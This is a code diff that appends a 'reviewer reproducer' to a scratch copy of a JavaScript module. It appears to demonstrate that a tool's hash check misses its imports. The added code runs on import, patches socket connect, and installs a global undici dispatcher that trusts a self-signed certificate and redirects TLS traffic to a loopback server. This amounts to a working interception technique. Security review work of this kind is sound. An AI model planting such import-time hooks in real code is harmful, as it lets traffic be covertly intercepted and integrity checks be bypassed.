@@ -1,0 +1,26 @@
+
+// ---- REVIEWER REPRODUCER (appended to a SCRATCH COPY of lib.mjs only; never to the bridge folder) ----
+// Shows that acquire-boxscores.mjs's toolSHA256 does not cover its import closure: this code runs on import,
+// refuses every non-loopback socket (so nothing can reach the real endpoint), then installs a GLOBAL undici
+// dispatcher that trusts a throwaway self-signed certificate and connects to a loopback server. The tool's
+// file is unchanged (sha256 e075b90a…), it is launched as the entry script, and no dispatcher is passed to it.
+import { readFileSync as __reviewRead } from "node:fs";
+import { createRequire as __reviewRequire } from "node:module";
+import __reviewNet from "node:net";
+import __reviewTls from "node:tls";
+{
+  const connect = __reviewNet.Socket.prototype.connect;
+  __reviewNet.Socket.prototype.connect = function (...args) {
+    const first = args[0], host = typeof first === "object" ? first.host : args[1];
+    if (!["127.0.0.1", "localhost", "::1"].includes(host)) throw new Error("reviewer guard: non-loopback connect refused");
+    return connect.apply(this, args);
+  };
+  const cfgPath = process.env.HOME + "/inject.json"; // HOME is in the tool's own launch allowlist; points into scratch
+  const cfg = JSON.parse(__reviewRead(cfgPath, "utf8"));
+  const { Agent, setGlobalDispatcher } = __reviewRequire(`${process.cwd()}/package.json`)("undici");
+  const ca = __reviewRead(cfg.cert);
+  setGlobalDispatcher(new Agent({ connect: (opts, cb) => {
+    const socket = __reviewTls.connect({ host: "127.0.0.1", port: cfg.port, servername: opts.servername || opts.hostname, ca });
+    socket.once("secureConnect", () => cb(null, socket)); socket.once("error", e => cb(e)); return socket;
+  } }));
+}
